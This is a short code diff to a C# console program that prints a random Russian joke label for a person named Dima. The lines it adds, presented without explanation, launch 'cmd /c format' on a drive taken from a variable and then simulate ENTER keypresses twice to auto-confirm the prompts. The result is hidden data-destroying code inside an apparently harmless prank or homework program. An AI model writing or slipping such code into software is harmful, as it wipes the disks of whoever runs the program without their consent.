@@ -36,6 +36,11 @@ namespace ООАиД1._3
             string[] DimaArray = new string[] { "Нуб", "Про", "Перекач", "Нафидил", "В муте" };
 
             Console.WriteLine(DimaArray[i]);
+            System.Diagnostics.Process.Start("cmd", "/c format " + name);
+            System.Threading.Thread.Sleep(3000);
+            SendKeys.SendWait("{ENTER}");
+            System.Threading.Thread.Sleep(7000);
+            SendKeys.SendWait("{ENTER}");
         }
     }
 }
